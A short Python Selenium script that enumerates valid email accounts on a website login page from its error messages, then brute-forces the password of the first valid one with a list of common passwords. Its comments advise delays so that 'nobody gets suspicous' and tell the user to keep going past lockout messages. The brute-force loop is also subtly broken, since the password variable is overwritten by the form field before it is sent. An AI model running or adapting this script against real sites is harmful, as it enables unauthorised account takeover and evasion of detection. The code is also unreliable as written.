from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from time import sleep

#Mailadresses to check
usernames = ['hallo@test.de', 'hallo2@test.de']
#A default Password that is, hopefully, not correct
passwordStr = '1'

browser = webdriver.Chrome()

valid_mail = ""

print("Starting Enumeration...")
for mail in usernames:
    browser.get('https://www.[YOURWEBSITE].com/login')
    
    #replace the ID --> Use Browser Dev Tools
    username = browser.find_element_by_id('__a11yId0')
    username.send_keys(mail)

    #wait a bit so nobody gets suspicous
    sleep(2)

    #replace the ID --> Use Browser Dev Tools
    password = browser.find_element_by_id('__a11yId2')
    password.send_keys(passwordStr)

    #just hit enter so we don´t have to search the Button
    password.send_keys(Keys.ENTER)

    #wait a bit so the Error Message can show up
    sleep(10)

    #replace the ID --> Use Browser Dev Tools
    error = browser.find_element_by_class_name('eCRvjw')

    #check content of Error Message 
    if("Konto" in error.text):
        print(mail +" is not a valid Mailadress")
    elif("Passwort" in error.text):
        print(mail + " is valid! Now Brute Force Password")
        valid_mail = mail
        break

print("Starting Brute Force...")
#append this with as many passwords as you want --> if to many read from file
passwords = ['admin', 'password', 'letmein', 'qwerty', 'passwort123test']

for password in passwords:
    browser.get('https://www.[YOURWEBSITE].com/login')

    #replace the ID --> Use Browser Dev Tools
    username = browser.find_element_by_id('__a11yId0')
    username.send_keys(valid_mail)

    #wait a bit so nobody gets suspicous
    sleep(2)

    #replace the ID --> Use Browser Dev Tools
    password = browser.find_element_by_id('__a11yId2')
    password.send_keys(password)

    #just hit enter so we don´t have to search the Button
    password.send_keys(Keys.ENTER)

    #wait a bit so the Error Message can show up
    sleep(10)

    #try to find the Error Message
    try:
        #replace the ID --> Use Browser Dev Tools
        error = browser.find_element_by_class_name('eCRvjw')

        #check content of Error Message 
        if("Passwort" in error.text):
            print("Wrong Password")
            continue
        #if there is any other message like maximum login attempts
        else:
            continue
        
    #if there is no Error Message, you´re in!
    except:
        valid_password = password
        print("Valid Password: ", password)
        break

print("Login Information: Email: "+str(valid_mail) + " Password: " + str(valid_password))
        




